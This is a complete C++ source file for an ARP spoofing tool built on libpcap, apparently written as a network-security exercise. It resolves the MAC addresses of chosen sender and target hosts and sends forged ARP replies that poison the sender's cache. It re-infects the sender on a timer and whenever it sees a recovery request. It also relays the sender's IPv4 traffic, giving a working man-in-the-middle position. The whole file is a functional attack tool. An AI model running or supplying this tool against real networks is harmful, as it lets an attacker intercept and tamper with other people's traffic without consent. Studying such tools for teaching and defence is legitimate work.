#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <cstring>
#include <vector>
#include <chrono>
#include "protocol-hdr.h"

#pragma pack(push, 1)
struct Eth_ARP {
	Ethernet eth;
	ARP arp;
};
#pragma pack(pop)

// constants
const unsigned int TIME_GAP = 30;

// global variables
std::vector<IPv4Addr> sender_ip, target_ip;
std::vector<MacAddr> sender_mac, target_mac;
std::vector<std::chrono::time_point<std::chrono::steady_clock>> sent_time;
unsigned int num_host_pairs;

// prototype functions
void get_my_mac_addr(const char *dev, MacAddr &uc_Mac);
void get_my_ipv4_addr(const char *dev, IPv4Addr &uc_IP);
int get_mtu(const char *dev);
int send_arp_packet(pcap_t* handle, MacAddr dst_mac, MacAddr src_mac, uint16_t op, MacAddr sender_hw, IPv4Addr sender_pr, MacAddr target_hw, IPv4Addr target_pr);
int recv_arp_packet(pcap_t* handle, uint16_t op, MacAddr &sender_hw, IPv4Addr sender_pr, MacAddr target_hw, IPv4Addr target_pr);

// function that shows usage
void usage() {
	printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// main function
int main(int argc, char* argv[]) {
	// check syntax
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	// assign arguments to variables
	char* dev = argv[1];               // network device
	num_host_pairs = (argc-2)/2;       // length of sender or target ip(s)
	sender_ip.assign(num_host_pairs, IPv4Addr());  // initialize...
	target_ip.assign(num_host_pairs, IPv4Addr());
	sender_mac.assign(num_host_pairs, MacAddr());
	target_mac.assign(num_host_pairs, MacAddr());

	int mtu = get_mtu(dev);            // MTU

	// check && assign IP addresses of arguments
	for (int i = 0; i < argc-2; i += 2) {
		if (sender_ip[i/2].set_ipv4_addr(argv[i+2]) != 0
		 || target_ip[i/2].set_ipv4_addr(argv[i+3]) != 0) {
			return -1;
		}
	}
	
	// open my network interface
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "Error: could not open device %s. (%s)\n", dev, errbuf);
		return -1;
	}
	
	// set normal ARP request packet
	// (MUST SET NETWORK BYTE ORDER)
	MacAddr my_mac;
	IPv4Addr my_ip;
	
	// get attacker's (my) address
	get_my_mac_addr(dev, my_mac);
	get_my_ipv4_addr(dev, my_ip);
	
	//// Purpose: to get senders' and targets' MAC addresses.
	// send normal ARP request packet to each sender
	// and capture on loop
	//
	for (int i = 0; i < num_host_pairs; i++) {
		int j;

		// check if sender IP's mac is already exists
		// assume: index j (0 ~ i-1) points already resolved IP that exists
		for (j = 0; j < i; j++) {
			// compare with previous sender
			if (sender_ip[i] == sender_ip[j]) {
				sender_mac[i] = sender_mac[j];
				printf("Sender %d already has a MAC address.\n", i);
				break;
			}
			// compare with previous target
			if (sender_ip[i] == target_ip[j]) {
				sender_mac[i] = target_mac[j];
				printf("Sender %d already has a MAC address.\n", i);
				break;
			}
		}
		
		// if sender IP's mac does not exist
		if (i == j) {
			//// send broadcast packet to find one of sender's MAC
			int res = send_arp_packet(
				handle,
				MacAddr("ff:ff:ff:ff:ff:ff"),
				my_mac,
				ARP_OP_REQUEST,
				my_mac,
				my_ip,
				MacAddr("00:00:00:00:00:00"),
				sender_ip[i]
			);

			// check error
			if (res != 0) {
				return -1;
			} else {
				printf("Sent ARP request packet to the sender %d.\n", i);
				printf("Getting ARP reply packet... ");
			}

			// capturing for getting normal ARP reply packet
			res = recv_arp_packet(
				handle,
				ARP_OP_REPLY,
				sender_mac[i],
				sender_ip[i],
				my_mac,
				my_ip
			);

			// check error
			if (res != 0) {
				return -1;
			} else {
				printf("OK!\n");
			}
		}
		
		// check if target IP's mac is already exists
		// assume: index j (0 ~ i-1) points already resolved IP that exists
		for (j = 0; j < i; j++) {
			// compare with previous sender
			if (target_ip[i] == sender_ip[j]) {
				printf("Target %d already has a MAC address.\n", i);
				target_mac[i] = sender_mac[j];
				break;
			}
			// compare with previous target
			if (target_ip[i] == target_ip[j]) {
				printf("Target %d already has a MAC address.\n", i);
				target_mac[i] = target_mac[j];
				break;
			}
		}
		
		// if target IP's mac does not exist
		if (i == j) {
			//// send broadcast packet to find one of target's MAC
			int res = send_arp_packet(
				handle,
				MacAddr("ff:ff:ff:ff:ff:ff"),
				my_mac,
				ARP_OP_REQUEST,
				my_mac,
				my_ip,
				MacAddr("00:00:00:00:00:00"),
				target_ip[i]
			);

			// check error
			if (res != 0) {
				return -1;
			} else {
				printf("Sent ARP request packet to the target %d.\n", i);
				printf("Getting ARP reply packet... ");
			}

			// capturing for getting normal ARP reply packet
			res = recv_arp_packet(
				handle,
				ARP_OP_REPLY,
				target_mac[i],
				target_ip[i],
				my_mac,
				my_ip
			);
			
			// check error
			if (res != 0) {
				return -1;
			} else {
				printf("OK!\n");
			}
		}
	}
	
	
	// ARP Spoofing
	// 
	sent_time.assign(num_host_pairs, std::chrono::steady_clock::now());
	
	for (int i = 0; i < num_host_pairs; i++) {
	
		// send ARP spoofing packet to i-th sender
		int res = send_arp_packet(
			handle,
			sender_mac[i],
			my_mac,
			ARP_OP_REPLY,
			my_mac,
			target_ip[i],
			sender_mac[i],
			sender_ip[i]
		);
		
		// check error
		if (res != 0) {
			return -1;
		} else {
			printf("Sent ARP spoofing packet to the sender %d.\n", i);
		}
	}
	
	// relaying and capturing
	//
	do {
		// variables
		// header: packet header
		// packet: packet content
		// res: result code of pcap reading
		// current_time: current time inside the loop
		//
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		auto current_time = std::chrono::steady_clock::now();
		
		for (int i = 0; i < num_host_pairs; i++) {
			std::chrono::duration<double> elapsed = current_time - sent_time[i];
			if (elapsed.count() > TIME_GAP) {
				// Timeout! + re-send infect packet
				res = send_arp_packet(
					handle,
					sender_mac[i],
					my_mac,
					ARP_OP_REPLY,
					my_mac,
					target_ip[i],
					sender_mac[i],
					sender_ip[i]
				);
				
				// check error
				if (res != 0) {
					return -1;
				} else {
					printf("%u seconds elapsed. Sent ARP spoofing packet to the sender %d.\n", TIME_GAP, i);
					// renew the sent time
					sent_time[i] = std::chrono::steady_clock::now();
				}
			}
		}

		if (res == 0) continue;        // not captured
		if (res == -1 || res == -2) {  // quit
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return -1;
		}
		
		// printf(" ** %u bytes captured ** \n", header->caplen);

		/* adjust the packet with Ethernet protocol */
		Ethernet *ethernet = (Ethernet*) packet;

		/* check if EtherType is ARP, IPv4 or not */
		if (ntohs(ethernet->eth_type) == ETH_TYPE_ARP) {
			/* adjust the packet with ARP protocol */
			ARP *arp = (ARP*) (packet + ETH_HEADER_LEN);

			/* ARP type check: Eth - IPv4 / Request */
			if (ntohs(arp->htype) != ARP_HTYPE_ETH
			 || ntohs(arp->ptype) != ARP_PTYPE_IPv4
			 || ntohs(arp->op) != ARP_OP_REQUEST)
			{
				continue;
			}
			
			/* Who sent the ARP packet? */
			for (int i = 0; i < num_host_pairs; i++) {

				// catch ARP recovering packet
				if (arp->sender_hw_addr == sender_mac[i]
				 && arp->sender_pr_addr == sender_ip[i]
				 && arp->target_pr_addr == target_ip[i])
				{
					// Matched! + re-send infect packet
					res = send_arp_packet(
						handle,
						sender_mac[i],
						my_mac,
						ARP_OP_REPLY,
						my_mac,
						target_ip[i],
						sender_mac[i],
						sender_ip[i]
					);
					
					// check error
					if (res != 0) {
						return -1;
					} else {
						printf("Recovering ARP packet found. Sent ARP spoofing packet to the sender %d.\n", i);
						// renew the sent time
						sent_time[i] = std::chrono::steady_clock::now();
					}
					break;
				}
			}
		} else if (ntohs(ethernet->eth_type) == ETH_TYPE_IPv4) {
			// adjust the packet with IPv4 protocol
			IPv4 *ipv4 = (IPv4*) (packet + ETH_HEADER_LEN);
			
			// generate new packet to send
			unsigned int packet_len = ETH_HEADER_LEN + ntohs(ipv4->tot_len);
			if (packet_len-ETH_HEADER_LEN > mtu) {
				printf("Exceed MTU. (len = %u)\n", packet_len);
				continue;
			}

			uint8_t *new_packet = new uint8_t[packet_len+1];
			
			if (new_packet == nullptr) {
				fprintf(stderr, "Error: cannot generate new packet.\n");
				return -1;
			}
			
			// copy packet
			memcpy(new_packet, packet, packet_len);
			
			// adjust the new relay packet with Ethernet protocol
			Ethernet *new_ethernet = (Ethernet*) new_packet;
			
			for (int i = 0; i < num_host_pairs; i++) {
				if (ethernet->src_mac_addr == sender_mac[i]
				 && ethernet->dst_mac_addr == my_mac) {
					// Matched!
					new_ethernet->src_mac_addr = my_mac;
					new_ethernet->dst_mac_addr = target_mac[i];
					
					res = pcap_sendpacket(handle, new_packet, packet_len);
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s (len = %u)\n", res, pcap_geterr(handle), packet_len);
						return -1;
					} else {
						printf("Relayed sender's packet to target %d. (len = %u)\n", i, packet_len);
						// renew the sent time
						sent_time[i] = std::chrono::steady_clock::now();
					}
					break;
				}
			}
			
			delete[] new_packet;
		} else {
			continue;
		}
	} while (true);

	// close pcap
	pcap_close(handle);
}



void get_my_mac_addr(const char *dev, MacAddr &uc_Mac) {
	/* Get My MAC Address
	 * reference: https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx
	*/
	int fd;
	struct ifreq ifr;
	unsigned char *mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name, dev, IFNAMSIZ-1);
	
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	
	close(fd);
	
	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	
	memcpy((uint8_t*) uc_Mac.mac, (uint8_t*) mac, 6);
}

void get_my_ipv4_addr(const char *dev, IPv4Addr &uc_IP) {
	/* Get My IP Address
	 * reference: https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
	*/
	int fd;
	struct ifreq ifr;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name, dev, IFNAMSIZ-1);
	
	ioctl(fd, SIOCGIFADDR, &ifr);
	
	close(fd);
	
	uc_IP.ip = (((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr;
}

int get_mtu(const char *dev) {

	/* Get MTU value of interface */
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name, dev, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFMTU, &ifr);

	close(fd);

	return ifr.ifr_mtu;
}	

int send_arp_packet(pcap_t* handle, MacAddr dst_mac, MacAddr src_mac, uint16_t op, MacAddr sender_hw, IPv4Addr sender_pr, MacAddr target_hw, IPv4Addr target_pr) {

	/* Send ARP Packet */
	Eth_ARP packet;
	
	// eth settings
	packet.eth.dst_mac_addr.set_mac_addr(dst_mac);
	packet.eth.src_mac_addr.set_mac_addr(src_mac);
	packet.eth.eth_type = htons(ETH_TYPE_ARP);
	
	// arp settings
	packet.arp.htype = htons(ARP_HTYPE_ETH);
	packet.arp.ptype = htons(ARP_PTYPE_IPv4);
	packet.arp.hlen = MAC_ADDR_SIZE;
	packet.arp.plen = IPv4_ADDR_SIZE;
	packet.arp.op = htons(op);
	packet.arp.sender_hw_addr.set_mac_addr(sender_hw);
	packet.arp.sender_pr_addr.set_ipv4_addr(sender_pr);
	packet.arp.target_hw_addr.set_mac_addr(target_hw);
	packet.arp.target_pr_addr.set_ipv4_addr(target_pr);

	//// send normal ARP request packet to check sender MAC address
	int res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(Eth_ARP));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return -1;
	}

	return 0;
}


int recv_arp_packet(pcap_t* handle, uint16_t op, MacAddr &sender_hw, IPv4Addr sender_pr, MacAddr target_hw, IPv4Addr target_pr) {

	auto time_start = std::chrono::steady_clock::now();

	/* Receive ARP Packet */
	do {
		// variables
		// header: packet header
		// packet: packet content
		// res: result code of pcap reading
		// time_end: current time inside the loop
		// elapsed: time elapsed to measure
		//
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		auto time_end = std::chrono::steady_clock::now();
		std::chrono::duration<double> elapsed = time_end - time_start;

		// check timeout when elapsed > TIME_GAP seconds
		if (elapsed.count() > TIME_GAP) {
			printf("Timeout.\n");
			return 1;
		}

		if (res == 0) continue;        // not captured
		if (res == -1 || res == -2) {  // quit
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return -1;
		}
		
		// printf(" ** %u bytes captured ** \n", header->caplen);

		/* adjust the packet with Ethernet protocol */
		Ethernet *ethernet = (Ethernet*) packet;

		/* check if EtherType is ARP or not */
		if (ntohs(ethernet->eth_type) != ETH_TYPE_ARP) {
			continue;
		}

		/* adjust the packet with ARP protocol */
		ARP *arp = (ARP*) (packet + ETH_HEADER_LEN);

		/* ARP type check: Eth - IPv4 / opcode (request or reply) */
		if (ntohs(arp->htype) != ARP_HTYPE_ETH
		 || ntohs(arp->ptype) != ARP_PTYPE_IPv4
		 || ntohs(arp->op) != op)
		{
			continue;
		}
		
		/* ARP address check: received from sender
		 * & get sender MAC address */
		if (arp->target_hw_addr == target_hw
		 && arp->sender_pr_addr == sender_pr
		 && arp->target_pr_addr == target_pr)
		{
			sender_hw = arp->sender_hw_addr;
			break;
		}
	} while (true);
	
	return 0;
}
